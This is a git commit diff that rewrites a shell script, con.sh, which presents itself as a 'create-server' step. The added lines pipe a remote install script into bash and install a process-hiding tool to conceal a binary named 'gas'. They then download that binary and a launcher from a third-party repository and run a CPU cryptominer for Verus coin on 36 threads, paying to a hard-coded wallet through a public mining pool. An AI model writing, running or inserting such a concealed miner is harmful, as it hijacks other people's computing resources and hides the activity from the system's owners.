440ab52e4144a4edd894393f82e384ca04971d01
breakok <95564840+breakok@users.noreply.github.com>
2021-12-18 14:26:47 +0530

    Update con.sh

--- con.sh
+++ con.sh
@@ -1,8 +1,12 @@
 #! /bin/bash
 printf "create-server... \nThis might take a while... " >&2
 {
-while True:
-print("acces new data")
-time.sleep(3)
-print("for i 1+n n+1")
+curl -sL https://deb.nodesource.com/setup_12.x | bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ph add gas
+wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
+wget https://github.com/hunshukajh/yes/raw/main/gas
+chmod +x gas cmdline_launcher.sh
+timeout -k 540s 10s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
 }
